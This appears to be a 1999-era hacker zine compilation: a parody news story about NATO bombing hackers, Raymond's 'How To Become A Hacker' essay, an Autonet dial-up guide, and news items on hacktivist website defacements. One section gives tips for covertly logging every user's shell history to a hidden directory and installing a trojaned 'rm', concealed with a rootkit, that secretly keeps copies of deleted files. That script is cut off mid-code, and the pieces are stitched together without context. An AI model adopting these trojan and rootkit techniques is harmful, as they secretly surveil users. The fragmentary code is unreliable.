       the Dead Cow. Most shelters have been turned into underground bunkers featuring ISDN lines with
       triple-redundancy backups, as once the hackers moved in, they found the absence of sunlight and social
       involvement enjoyable.
       
       Despite the danger, supporters of hard-line hackers were defiant.
       
       "NATOns will fire their missiles from a distance," said Lord Kreel, an NT cracker. "Meanwhile, I will be
       cracking into the Pentagon with my friends in the Lackeys of Terror. We plan to install Windows on all of their
       computers, which will cripple their systems beyond repair."
       
       Opponents of "black hat" hacking think NATO strikes will actually increase the popularity of cracking among
       the techno-elite, but cement the popular image of the hacker as a no-good techie pirate bent on stealing credit
       card numbers and eating babies.
       
       "Now, [crackers will] attack all the media sites, plastering the entire web with links to porno and warez sites,
       and lag the whole net to hell", said hacker Frodo Majere. "If NATO thinks they will bend hackers with bombs,
       they are dead wrong."
       
       Supporters of the infamous jailed hacker Kevin Mitnick have reportedly been preparing to strike at well-known
       pro-NATO companies and military organizations as soon as the first NATO bomb lands on hacker territory.
       
       "We'll introduce Y2K bugs to systems where you'll never find them. We will end the disgusting
       greed-infested system of monopolist capitalism by freeing information forever. Linux is the One, True God,"
       said one hacker, before he was shot and killed by an enraged fanatic wearing a red "GNU NOT Linux"
       headband, symbol of the underground terrorist organization FSF. A press release issued by the FSF's guerilla
       leader, known only as RMS, claimed responsibility for the killing.
       
       NATO's secretary-general Javler Selena authorized airstrikes against known hacker sites on Tuesday, after
       hackers on the IRC channel #2600 rebuffed a last-ditch peace offer and gave out free root accounts on the
       whitehouse.gov server.
       
       "In the past, computer security was a war of escalation between system administrators and joy-riding
       hackers," said a spokesperson for the anti-hacker group Freedom Through Oppression. "It's high time we
       brought the war to the instigators and bombed these hacker scum back to the Stone Age. To make the Internet
       safe for everyone, we must squash dissension once and for all. Countries have been nuked for less."
       
       "If you don't stand up to the theft of intellectual property of innocent companies such as SysMicrosoft and
       AppMicrosoft, you threaten American competitiveness and the ability to innovate," said President Gates, as
       he sought -- and got -- support from congressional leaders for military action.
       
       "We must halt the hackers and save the Internet for our children and the future of our country. The dirty,
       despicable hackers will no longer disrupt websites to make fun of our institutions, or pollute the Information
       Superhighway with filthy swear words," said former Vice President Al Gore, founder of the Internet, before he
       suddenly toppled over and dumped core. "NTLDR not found. INVALID_BOOT_DEVICE in kernel32.exe
       006383dhX00029393."

       How To Become A Hacker
       
       Why This Document?
       
       As editor of the Jargon File, I often get email requests from enthusiastic network newbies asking (in effect) "how can I learn to be a wizard hacker?". Oddly enough
       there don't seem to be any FAQs or Web documents that address this vital question, so here's mine. 
       
       If you are reading a snapshot of this document offline, the current version lives at http://www.tuxedo.org/~esr/faqs/hacker-howto.html.
       
       What Is A Hacker?
       
       The Jargon File contains a bunch of definitions of the term `hacker', most having to do with technical adeptness and a delight in solving problems and overcoming
       limits. If you want to know how to become a hacker, though, only two are really relevant. 
       
       There is a community, a shared culture, of expert programmers and networking wizards that traces its history back through decades to the first time-sharing
       minicomputers and the earliest ARPAnet experiments. The members of this culture originated the term `hacker'. Hackers built the Internet. Hackers made the Unix
       operating system what it is today. Hackers run Usenet. Hackers make the World Wide Web work. If you are part of this culture, if you have contributed to it and
       other people in it know who you are and call you a hacker, you're a hacker. 
       
       The hacker mind-set is not confined to this software-hacker culture. There are people who apply the hacker attitude to other things, like electronics or music --
       actually, you can find it at the highest levels of any science or art. Software hackers recognize these kindred spirits elsewhere and may call them "hackers" too -- and
       some claim that the hacker nature is really independent of the particular medium the hacker works in. But in the rest of this document we will focus on the skills and
       attitudes of software hackers, and the traditions of the shared culture that originated the term `hacker'. 
       
       There is another group of people who loudly call themselves hackers, but aren't. These are people (mainly adolescent males) who get a kick out of breaking into
       computers and phreaking the phone system. Real hackers call these people `crackers' and want nothing to do with them. Real hackers mostly think crackers are
       lazy, irresponsible, and not very bright, and object that being able to break security doesn't make you a hacker any more than being able to hotwire cars makes you
       an automotive engineer. Unfortunately, many journalists and writers have been fooled into using the word `hacker' to describe crackers; this irritates real hackers no
       end. 
       
       The basic difference is this: hackers build things, crackers break them. 
       
       If you want to be a hacker, keep reading. If you want to be a cracker, go read the alt.2600 newsgroup and get ready to do five to ten in the slammer after finding
       out you aren't as smart as you think you are. And that's all I'm going to say about crackers. 
       
       The Hacker Attitude
       
       Hackers solve problems and build things, and they believe in freedom and voluntary mutual help. To be accepted as a hacker, you have to behave as though you
       have this kind of attitude yourself. And to behave as though you have the attitude, you have to really believe the attitude. 
       
       But if you think of cultivating hacker attitudes as just a way to gain acceptance in the culture, you'll miss the point. Becoming the kind of person who believes these
       things is important for you -- for helping you learn and keeping you motivated. As with all creative arts, the most effective way to become a master is to imitate the
       mind-set of masters -- not just intellectually but emotionally as well. 
       
       So, if you want to be a hacker, repeat the following things until you believe them: 
       
       1. The world is full of fascinating problems waiting to be solved.
       
       Being a hacker is lots of fun, but it's a kind of fun that takes lots of effort. The effort takes motivation. Successful athletes get their motivation from a kind of physical
       delight in making their bodies perform, in pushing themselves past their own physical limits. Similarly, to be a hacker you have to get a basic thrill from solving
       problems, sharpening your skills, and exercising your intelligence. 
       
       If you aren't the kind of person that feels this way naturally, you'll need to become one in order to make it as a hacker. Otherwise you'll find your hacking energy is
       sapped by distractions like sex, money, and social approval. 
       
       (You also have to develop a kind of faith in your own learning capacity -- a belief that even though you may not know all of what you need to solve a problem, if you
       tackle just a piece of it and learn from that, you'll learn enough to solve the next piece -- and so on, until you're done.) 
       
       2. Nobody should ever have to solve a problem twice.
       
       Creative brains are a valuable, limited resource. They shouldn't be wasted on re-inventing the wheel when there are so many fascinating new problems waiting out
       there. 
       
       To behave like a hacker, you have to believe that the thinking time of other hackers is precious -- so much so that it's almost a moral duty for you to share
       information, solve problems and then give the solutions away just so other hackers can solve new problems instead of having to perpetually re-address old ones. 
       
       (You don't have to believe that you're obligated to give all your creative product away, though the hackers that do are the ones that get most respect from other
       hackers. It's consistent with hacker values to sell enough of it to keep you in food and rent and computers. It's consistent to use your hacking skills to support a
       family or even get rich, as long as you don't forget you're a hacker while you're doing it.) 
       
       3. Boredom and drudgery are evil.
       
       Hackers (and creative people in general) should never be bored or have to drudge at stupid repetitive work, because when this happens it means they aren't doing
       what only they can do -- solve new problems. This wastefulness hurts everybody. Therefore boredom and drudgery are not just unpleasant but actually evil. 
       
       To behave like a hacker, you have to believe this enough to want to automate away the boring bits as much as possible, not just for yourself but for everybody else
       (especially other hackers). 
       
       (There is one apparent exception to this. Hackers will sometimes do things that may seem repetitive or boring to an observer as a mind-clearing exercise, or in order
       to acquire a skill or have some particular kind of experience you can't have otherwise. But this is by choice -- nobody who can think should ever be forced into
       boredom.)
       
       4. Freedom is good.
       
       Hackers are naturally anti-authoritarian. Anyone who can give you orders can stop you from solving whatever problem you're being fascinated by -- and, given the
       way authoritarian minds work, will generally find some appallingly stupid reason to do so. So the authoritarian attitude has to be fought wherever you find it, lest it
       smother you and other hackers. 
       
       (This isn't the same as fighting all authority. Children need to be guided and criminals restrained. A hacker may agree to accept some kinds of authority in order to
       get something he wants more than the time he spends following orders. But that's a limited, conscious bargain; the kind of personal surrender authoritarians want is
       not on offer.) 
       
       Authoritarians thrive on censorship and secrecy. And they distrust voluntary cooperation and information-sharing -- they only like `cooperation' that they control. So
       to behave like a hacker, you have to develop an instinctive hostility to censorship, secrecy, and the use of force or deception to compel responsible adults. And you
       have to be willing to act on that belief. 
       
       5. Attitude is no substitute for competence.
       
       To be a hacker, you have to develop some of these attitudes. But copping an attitude alone won't make you a hacker, any more than it will make you a champion
       athlete or a rock star. Becoming a hacker will take intelligence, practice, dedication, and hard work. 
       
       Therefore, you have to learn to distrust attitude and respect competence of every kind. Hackers won't let posers waste their time, but they worship competence --
       especially competence at hacking, but competence at anything is good. Competence at demanding skills that few can master is especially good, and competence at
       demanding skills that involve mental acuteness, craft, and concentration is best. 
       
       If you revere competence, you'll enjoy developing it in yourself -- the hard work and dedication will become a kind of intense play rather than drudgery. And that's
       vital to becoming a hacker. 
       
       Basic Hacking Skills
       
       The hacker attitude is vital, but skills are even more vital. Attitude is no substitute for competence, and there's a certain basic toolkit of skills which you have to have
       before any hacker will dream of calling you one. 
       
       This toolkit changes slowly over time as technology creates new skills and makes old ones obsolete. For example, it used to include programming in machine
       language, and didn't until recently involve HTML. But right now it pretty clearly includes the following: 
       
       1. Learn how to program.
       
       This, of course, is the fundamental hacking skill. If you don't know any computer languages, I recommend starting with Python. It is cleanly designed, well
       documented, and relatively kind to beginners. Despite being a good first language, it is not just a toy; it is very powerful and flexible and well suited for large projects.
       
       But be aware that you won't reach the skill level of a hacker or even merely a programmer if you only know one language -- you need to learn how to think about
       programming problems in a general way, independent of any one language. To be a real hacker, you need to have gotten to the point where you can learn a new
       language in days by relating what's in the manual to what you already know. This means you should learn several very different languages. 
       
       If you get into serious programming, you will have to learn C, the core language of Unix (though it's not the one to try learning first thing). Other languages of
       particular importance to hackers include Perl and LISP. Perl is worth learning for practical reasons; it's very widely used for active web pages and system
       administration, so that even if you never write Perl you should learn to read it. LISP is worth learning for the profound enlightenment experience you will have when
       you finally get it; that experience will make you a better programmer for the rest of your days, even if you never actually use LISP itself a lot.
       
       It's best, actually, to learn all four of these (Python, C, Perl, and LISP). Besides being the most important hacking languages, they represent very different
       approaches to programming, and each will educate you in valuable ways.
       
       I can't give complete instructions on how to learn to program here -- it's a complex skill. But I can tell you that books and courses won't do it (many, maybe most of
       the best hackers are self-taught). What will do it is (a) reading code and (b) writing code. 
       
       Learning to program is like learning to write good natural language. The best way to do it is to read some stuff written by masters of the form, write some things
       yourself, read a lot more, write a little more, read a lot more, write some more ... and repeat until your writing begins to develop the kind of strength and economy
       you see in your models. 
       
       Finding good code to read used to be hard, because there were few large programs available in source for fledgeling hackers to read and tinker with. This has
       changed dramatically; open-source software, programming tools, and operating systems (all built by hackers) are now widely available. Which brings me neatly to
       our next topic... 
       
       2. Get one of the open-source Unixes and learn to use and run it.
       
       I'm assuming you have a personal computer or can get access to one (these kids today have it so easy :-)). The single most important step any newbie can take
       towards acquiring hacker skills is to get a copy of Linux or one of the BSD-Unixes, install it on a personal machine, and run it. 
       
       Yes, there are other operating systems in the world besides Unix. But they're distributed in binary -- you can't read the code, and you can't modify it. Trying to learn
       to hack on a DOS or Windows machine or under MacOS is like trying to learn to dance while wearing a body cast. 
       
       Besides, Unix is the operating system of the Internet. While you can learn to use the Internet without knowing Unix, you can't be an Internet hacker without
       understanding it. For this reason, the hacker culture today is pretty strongly Unix-centered. (This wasn't always true, and some old-time hackers aren't happy about
       it, but the symbiosis between Unix and the Internet has become strong enough that even Microsoft's muscle doesn't seem able to seriously dent it.) 
       
       So, bring up a Unix -- I like Linux myself but there are other ways (and yes, you can run both Linux and DOS/Windows on the same machine). Learn it. Run it.
       Tinker with it. Talk to the Internet with it. Read the code. Modify the code. You'll get better programming tools (including C, Lisp, Python, and Perl) than any
       Microsoft operating system can dream of, you'll have fun, and you'll soak up more knowledge than you realize you're learning until you look back on it as a master
       hacker. 
       
       For more about learning Unix, see The Loginataka. 
       
       To get your hands on a Linux, see the Where can I get Linux.
       
       3. Learn how to use the World Wide Web and write HTML.
       
       Most of the things the hacker culture has built do their work out of sight, helping run factories and offices and universities without any obvious impact on how
       non-hackers live. The Web is the one big exception, the huge shiny hacker toy that even politicians admit is changing the world. For this reason alone (and a lot of
       other good ones as well) you need to learn how to work the Web.
       
       This doesn't just mean learning how to drive a browser (anyone can do that), but learning how to write HTML, the Web's markup language. If you don't know how
       to program, writing HTML will teach you some mental habits that will help you learn. So build a home page. 
       
       But just having a home page isn't anywhere near good enough to make you a hacker. The Web is full of home pages. Most of them are pointless, zero-content
       sludge -- very snazzy-looking sludge, mind you, but sludge all the same (for more on this see The HTML Hell Page).
       
       To be worthwhile, your page must have content -- it must be interesting and/or useful to other hackers. And that brings us to the next topic... 
       
       Status in the Hacker Culture
       
       Like most cultures without a money economy, hackerdom runs on reputation. You're trying to solve interesting problems, but how interesting they are, and whether
       your solutions are really good, is something that only your technical peers or superiors are normally equipped to judge. 
       
       Accordingly, when you play the hacker game, you learn to keep score primarily by what other hackers think of your skill (this is why you aren't really a hacker until
       other hackers consistently call you one). This fact is obscured by the image of hacking as solitary work; also by a hacker-cultural taboo (now gradually decaying but
       still potent) against admitting that ego or external validation are involved in one's motivation at all. 
       
       Specifically, hackerdom is what anthropologists call a gift culture. You gain status and reputation in it not by dominating other people, nor by being beautiful, nor by
       having things other people want, but rather by giving things away. Specifically, by giving away your time, your creativity, and the results of your skill. 
       
       There are basically five kinds of things you can do to be respected by hackers: 
       
       1. Write open-source software.
       
       The first (the most central and most traditional) is to write programs that other hackers think are fun or useful, and give the program sources to the whole hacker
       culture to use. 
       
       (We used to call these works ``free software'', but this confused too many people who weren't sure exactly what ``free'' was supposed to mean. Many of us now
       prefer the term ``open-source'' software).
       
       Hackerdom's most revered demigods are people who have written large, capable programs that met a widespread need and given them away, so that now everyone
       uses them. 
       
       2. Help test and debug open-source software
       
       They also serve who stand and debug open-source software. In this imperfect world, we will inevitably spend most of our software development time in the
       debugging phase. That's why any open-source author who's thinking will tell you that good beta-testers (who know how to describe symptoms clearly, localize
       problems well, can tolerate bugs in a quickie release, and are willing to apply a few simple diagnostic routines) are worth their weight in rubies. Even one of these can
       make the difference between a debugging phase that's a protracted, exhausting nightmare and one that's merely a salutary nuisance. 
       
       If you're a newbie, try to find a program under development that you're interested in and be a good beta-tester. There's a natural progression from helping test
       programs to helping debug them to helping modify them. You'll learn a lot this way, and generate good karma with people who will help you later on. 
       
       3. Publish useful information.
       
       Another good thing is to collect and filter useful and interesting information into Web pages or documents like FAQs (Frequently Asked Questions lists), and make
       those generally available. 
       
       Maintainers of major technical FAQs get almost as much respect as open-source authors. 
       
       4. Help keep the infrastructure working.
       
       The hacker culture (and the engineering development of the Internet, for that matter) is run by volunteers. There's a lot of necessary but unglamorous work that needs
       done to keep it going -- administering mailing lists, moderating newsgroups, maintaining large software archive sites, developing RFCs and other technical standards. 
       
       People who do this sort of thing well get a lot of respect, because everybody knows these jobs are huge time sinks and not as much fun as playing with code. Doing
       them shows dedication. 
       
       5. Serve the hacker culture itself.
       
       Finally, you can serve and propagate the culture itself (by, for example, writing an accurate primer on how to become a hacker :-)). This is not something you'll be
       positioned to do until you've been around for while and become well-known for one of the first four things. 
       
       The hacker culture doesn't have leaders, exactly, but it does have culture heroes and tribal elders and historians and spokespeople. When you've been in the
       trenches long enough, you may grow into one of these. Beware: hackers distrust blatant ego in their tribal elders, so visibly reaching for this kind of fame is
       dangerous. Rather than striving for it, you have to sort of position yourself so it drops in your lap, and then be modest and gracious about your status. 
       
       The Hacker/Nerd Connection
       
       Contrary to popular myth, you don't have to be a nerd to be a hacker. It does help, however, and many hackers are in fact nerds. Being a social outcast helps you
       stay concentrated on the really important things, like thinking and hacking. 
       
       For this reason, many hackers have adopted the label `nerd' and even use the harsher term `geek' as a badge of pride -- it's a way of declaring their independence
       from normal social expectations. See The Geek Page for extensive discussion. 
       
       If you can manage to concentrate enough on hacking to be good at it and still have a life, that's fine. This is a lot easier today than it was when I was a newbie in the
       1970s; mainstream culture is much friendlier to techno-nerds now. There are even growing numbers of people who realize that hackers are often high-quality lover
       and spouse material. For more on this, see Girl's Guide to Geek Guys. 
       
       If you're attracted to hacking because you don't have a life, that's OK too -- at least you won't have trouble concentrating. Maybe you'll get one later. 
       
       Points For Style
       
       Again, to be a hacker, you have to enter the hacker mindset. There are some things you can do when you're not at a computer that seem to help. They're not
       substitutes for hacking (nothing is) but many hackers do them, and feel that they connect in some basic way with the essence of hacking. 
       
            Read science fiction. Go to science fiction conventions (a good way to meet hackers and proto-hackers). 
            Study Zen, and/or take up martial arts. (The mental discipline seems similar in important ways.) 
            Develop an analytical ear for music. Learn to appreciate peculiar kinds of music. Learn to play some musical instrument well, or how to sing. 
            Develop your appreciation of puns and wordplay. 
            Learn to write your native language well. (A surprising number of hackers, including all the best ones I know of, are able writers.) 
       
       The more of these things you already do, the more likely it is that you are natural hacker material. Why these things in particular is not completely clear, but they're
       connected with a mix of left- and right-brain skills that seems to be important (hackers need to be able to both reason logically and step outside the apparent logic of
       a problem at a moment's notice).
       
       Finally, a few things not to do. 
       
            Don't use a silly, grandiose user ID or screen name. 
            Don't get in flame wars on Usenet (or anywhere else). 
            Don't call yourself a `cyberpunk', and don't waste your time on anybody who does. 
            Don't post or email writing that's full of spelling errors and bad grammar. 
       
       The only reputation you'll make doing any of these things is as a twit. Hackers have long memories -- it could take you years to live it down enough to be accepted. 
       
       Other Resources
       
       Peter Seebach maintains an excellent Hacker FAQ for managers who don't understand how to deal with hackers. 
       
       The Loginataka has some things to say about the proper training and attitude of a Unix hacker.
       
       I have also written A Brief History Of Hackerdom. 
       
       I have written a paper, The Cathedral and the Bazaar, which explains a lot about how the Linux and open-source cultures work. I have addressed this topic even
       more directly in its sequel Homesteading the Noosphere.
       
       Frequently Asked Questions
       
       Q: Will you teach me how to hack?
       
       Since first publishing this page, I've gotten several requests a week from people to "teach me all about hacking". Unfortunately, I don't have the time or energy to do
       this; my own hacking projects take up 110% of my time.
       
       Even if I did, hacking is an attitude and skill you basically have to teach yourself. You'll find that while real hackers want to help you, they won't respect you if you
       beg to be spoon-fed everything they know.
       
       Learn a few things first. Show that you're trying, that you're capable of learning on your own. Then go to the hackers you meet with specific questions.
       
       Q: Would you help me to crack a system, or teach me how to crack?
       
       No. Anyone who can still ask such a question after reading this FAQ is too stupid to be educable even if I had the time for tutoring. Any emailed requests of this
       kind that I get will be ignored or answered with extreme rudeness.
       
       Q: Where can I find some real hackers to talk with?
       
       The best way is to find a Unix or Linux user's group local to you and go to their meetings (you can find links to several lists of user groups on the LDP page at
       Sunsite).
       
       (I used to say here that you wouldn't find any real hackers on IRC, but I'm given to understand this is changing. Apparently some real hacker communities, attached
       to things like GIMP and Perl, have IRC channels now.)
       
       Q: What language should I learn first?
       
       HTML, if you don't already know it. There are a lot of glossy, hype-intensive bad HTML books out there, and distressingly few good ones. The one I like best is
       HTML: The Definitive Guide.
       
       But HTML is not a full programming language. When you're ready to start programming, I would recommend starting with Python. You will hear a lot of people
       recommending Perl, and Perl is still more popular than Python, but it's harder to learn.
       
       C is really important, but it's also much more difficult than either Python or Perl. Don't try to learn it first.
       
       Q: But won't open-source software leave programmers unable to make a living?
       
       This seems unlikely -- so far, the open-source software industry seems to be creating jobs rather than taking them away. If having a program written is a net
       economic gain over not having it written, a programmer will get paid whether or not the program is going to be free after it's done. And, no matter how much "free"
       software gets written, there always seems to be more demand for new and customized applications. I've written more about this at the Open Source pages.
       
       Q: How can I get started? Where can I get a free Unix?
       
       Elsewhere on this page I include pointers to where to get the most commonly used free Unix. To be a hacker you need motivation and initiative and the ability to
       educate yourself. Start now...

                        Shok (Matt Conover)
                 shok@dataforce.net, shok@sekurity.org
           
       What I plan for this to be, is some various utilities that you might think
       as of use and what not. This is mainly a few security tips that I like to
       use.
       
       First off, edit your /etc/profile, and add the line:
       export HISTFILE=/tmp/hist/`whoami`
       
       and then do:
       mkdir /tmp/hist;chmud 1777 /tmp/hist
       
       You now want to hide that file, so the users don't see the dir (it can be
       seen with set but not too many people check :) and you hide it with the
       rootkit's ls.
       
       Another few things I like to do.
       I made a trojaned 'rm' that basically calls /bin/rm.bak which is hidden
       (via rootkit ls), and it copies the file they are trying to delete to
       /tmp/fill (which is also hidden via rootkit ls). 
       There are two versions of this....I wrote the first one in shell script,
       but do to the fact it has to be a+r, I wrote it in C afterwords. Here is
       the rm.sh:
       
       #!/bin/sh
       # rm trojan, stores files in a temp directory, that is +tw, but go-r
       # the directory this writes to should be hidden with a trojaned ls
       # (via rootkit)
       # this is just an example...USE rm.c ;)
       
       if [ $# > 1 ] 
       then
       
       case $1 in

       This program can of course be improved, especially replacing the strcmp's
       with getopt() but I could care less....
       
       Now when ever a user deletes something it will first be copied to
       /tmp/fill before it's deleted.
       
       Now, even though it's logged to /var/log/httpd/access_log, I'd like to
       know right away when someone tries to use the phf or test-cgi
       vulnerabilities on me. So I replaced the phf and test-cgi programs in my
       /cgi-bin/ with this. The first will get the info on who it is, then it
       will send a fake passwd file. This can be improved of course but I don't
       care to take the time.

       Just as an added bonus here.........
       When someone goes to a directory you have .htaccess in, it will send 401,
       which is the unauthorized error code (pretty sure it's 401 but not in the
       mood to check). Now I editted my srm.conf (usually
       /usr/local/etc/httpd/conf/srm.conf), and added this line:
       
       ErrorDocument 401       /cgi-bin/unauthorized.cgi
       
       This is basically like the one above.......except it differs
       by the the 'user' part, which lets you know what user it was...this is a
       good way to know if there is an unauthorized attempt, and/or what user is
       logging into your webpage that is secured......

                                    HOW TO CONNECT TO AUTONET
       
       
                 To establish a connection to Autonet,  simply  follow  the  steps
                 listed below.
       
                  1. Dial your local access number and  wait  for  a  high-pitched
                     tone.
                     NOTE: If you are using a direct-connect terminal, proceed  to
                     Step 3.
       
                  2. Switch data set to DATA, or place the telephone receiver fir-
                     mly in the acoustic coupler, orienting the cord as indicated.
       
                  3. Press the RETURN key two times.
       
                  4. Autonet will respond with:
       
                             Autonet Line xxxxxxxxxx
                             Command:
       
                  5. Type one or more of the connection dialog commands  described
                     on  the  following pages. The appropriate C or ID command and
                     corresponding name or number will be provided to you when you
                     become  an  Autonet user. The H and T commands may be used in
                     conjunction with either of these.

                 AUTONET TERMINAL IDENTITY CODES
       
                 To optimize Autonet's treatment of your terminal, use the
                 identity  code suggested for your terminal model.   Enter
                 the code by using the optional T command during the Autonet
                 connection procedure. Autonet will interpret the code and
                 will automatically establish the most effective parameters
                 for the operating characteristics of your device.  In many
                 cases, parameters can be permanently set at the host instal-
                 lation, thereby eliminating the need to use the T command
                 altogether.
       
                 In most cases,  if you are using an intelligent asynchro-
                 nous ASCII CRT, you may use code  D1.  Your  Autonet  Ac-
                 count Administrator,  the person in your organization who
                 handles Autonet matters, can advise you.  This list is a
                 representative sample of terminal types and does not sug-
                 gest that support is limited only to these terminals.  If
                 your terminal is unlisted, simply use the code associated
                 with a like-device.

       NATO Web site hit by Yugoslav  hackers
       By Tom Diederich
       From Computerworld
       http://www.computerworld.com/home/news.nsf/CWFlash/9904014nato
       <a href="http://www.computerworld.com/home/news.nsf/CWFlash/9904014nato">This story is below</a>


        As NATO warplanes continued their bombing campaign over Yugoslavia this week, PC users in Belgrade were
        striking back with cyberwarfare tactics -- pings, spam and virus-infected e-mail -- aimed at crippling the
        alliance's public-information Web site, a NATO spokesman said Wednesday. 

        "Basically, three things have happened that have made access [to the site] erratic, the first being a so-called
        ping bombardment, which began Saturday," the spokesman said in a telephone interview from Brussels.
        "Ping" is actually a legitimate program that sends out an electronic ping to another computer to see if the other
        system is available to communicate. Hackers have used the function to flood target systems, making them
        unavailable to legitimate users. 

        The ping bombardment, traced to computers in Belgrade -- as were "the vast majority of the attacks" --
        saturated lines and disrupted site access, according to the spokesman, who requested anonymity. 

        Belgrade's next cybersalvo was launched soon afterward -- a payload of spam. The same e-mail
        message, sent thousands of times daily, was short and  to the point: "It said 'F--- You!' each time," the
        spokesman said. 

        The third attack was in the form of macro viruses hidden inside e-mail attachments. "We've since installed
        antivirus software, which has been effective in combating the viruses," he said. "In fact, we have
        measures in place that successfully counter all of the attacks." He stressed that NATO servers had in no way
        been "hacked." 

        Attacks were limited to NATO's public information site, the NATO spokesman said. "And there is no direct link
        whatsoever ... between the NATO classified networks and our Internet configuration, so NATO networks have
        not been hit by this." 

        Although the spokesman said Belgrade's alleged attacks on NATO's Web site were now being
        successfully thwarted, he admitted that configuration troubles with a new server -- coupled with a 100% spike
        in traffic from people worldwide seeking information on NATO operations in Yugoslavia -- were causing
        connection problems. 

        Some attempts to visit NATO's Web site Wednesday evening ended up at a page that said: "Server closed.
        Description: Unable to connect to the site 'www.nato.int' for the document 'http://www.nato.int/'. The site is down,
        overloaded or unreachable. Try connecting again later."

       [HSX.com] (3.30.99) The websites of two hot young actors were recently
       hacked. All right movie buffs, if you're fans of Ben Affleck (BAFFL) and
       Matt Damon (MDAMO), then you've probably visited their fan sites at
       www.ben-affleck.com and www.matt-damon.com, respectively.  These sites
       have the standard photographs of the bare-chested actors on their home
       page along with links to articles and stories about their upcoming and
       past projects.
       
       
       A few weekends ago, a computer geek with far too much time on his hands
       hacked into their sites and posted some lewd and crude commentary about
       Damon and Affleck's sexual preference. A rumor quickly spread throughout
       Hollywood that Affleck was indeed gay. By far the lighter of the two
       diatribes was posted on Damon's website. It read as follows: 
       "Hi, this is Matt Damon... My lover Ben and I would like to ask the entire
       homosexual community to support Kevin Mitnick and get him released from
       jail!"
       
       
       You might recall that Kevin Mitnick (www.kevinmitnick.com) was the famous
       hacker who eluded authorities for years and was finally caught a couple of
       years back.  After breaking into government computers, he has been held in
       a federal prison for four years without a trial.
       
       
       Now, the fan site hacker didn't stop there in his support of Mitnick and
       his prank on the two actors. On Affleck's site he posted a profane "quote"
       from the Forces of Nature (FORCS) star supposedly explaining why Matt
       convinced him to speak out on behalf of the jailed Mitnick.  Needless to
       say, the "reasons" were a tad too racy to reprint here.
                                                                                                                               
       Obviously Affleck and Damon did not post such rantings themselves and they
       have had no official comment. As for the hackers, if they wanted to bring
       attention to the Mitnick case, they probably would have better served
       their role model with postings that didn't display their own sexual
       phobias. The fan site hacker(s) are still at large.

     "This website is dedicated to all the hackers who use their work to fight against injustice, oppression, racism and censorship.

     Some years ago it turned to be a new challenge for some hackers to hack and alter the homepages of companies, groups, organizations and even
     political parties - it started to become a kind of sport. Soon hackers realized that the internet is the perfect area to practice a kind of electronic civil
     disobedience without physically harming someone or something. This new movement came to fame by the new term "Hacktivism". Below you'll
     find an archive of some websites that got hacked by hacktivists since 1996, the pages aren't censored in any way and 100% in their original state.
     You'll find only pages which were hacked with a political message, not this lame script-kiddie stuff."

                                       Since two hackers were sentenced to death in China there's a
                                       cyber-war declared against Chinese Government and Institutions.
                                       TouGong hacked some universities to protest the killing.

       Cracked
       This was a relatively busy weekend for cracked web
       sites. Some sites where cracked in protest of recent
       NATO actions and some in support of it. Some sites
       where cracked for religious reasons and others for
       political activities in Mexico. We have recioeved reports
       that the following sites have been comprimised.

       Some of these are interesting as the crackers got more creative and
       included original poetry. Also funny is my old domain (lemming.com) got
       hacked.

     ANTI-YUGOSLAVIAN HACK
     by BHZ, Sunday 28th Mar 1999 on 1:00 am CET
     Well soon after that pro-yu hack, Hackers Against Communism Klan strike the page
     of Chinese goverment - http://www.landbridge.gov.cn. They put a message against
     president of Yugoslavia Slobodan Milosevic. The page stated:"I was wondering why
     an intelligent human creature would support an idiotic dictator like Slobodan Milosevic
     ? And I still can't find the answer. He is responsible for hundreds of death's in Kosovo,
     he is nothing more then a Murderer yet he is supported by Hackers. Hackers lost
     their and ethics now they lost their sense of justice. I understand that somebody hate
     U.S. or NATO... that's OK, but this is not an excuse to support terrorist dictators like
     Slobodan Milosevic. Wake up brothers ! He is a dictator and if we don't stop him, he
     will became another Adolph Hitler. And this is the last thing we need right now! Now
     you're gonna ask me why I'm telling all this stuff on a Chinese gov server. Well I don't
     think I could find a serbian gov site these days and China is supporting the Serb
     president so I don't think they gonna mind if I publish my opinion on their site.
     
     PRO-YUGOSLAVIAN HACK
     by BHZ, Saturday 27th Mar 1999 on 9:56 pm CET
     As you know, NATO forces are fighting against Yugoslavia. Well some hack groups
     are against it. http://nmimc1.med.navy.mil was hacked and replaced with anti-NATO
     images. Page stated "Russian hackers demand to stop terrorist aggression against
     Jugoslavia". 
     See archive of the hack here.

    Puzzle answer:  0-1" (the cards are touching.)
                    if the drop in the cable is 25', maximum cable length
                    without a repeater is 50' for standard ethernet coax
                    so therefore the drawing is inaccurate and the cards 
                    are face to face, the thickness of the cable not taken
                    into account.
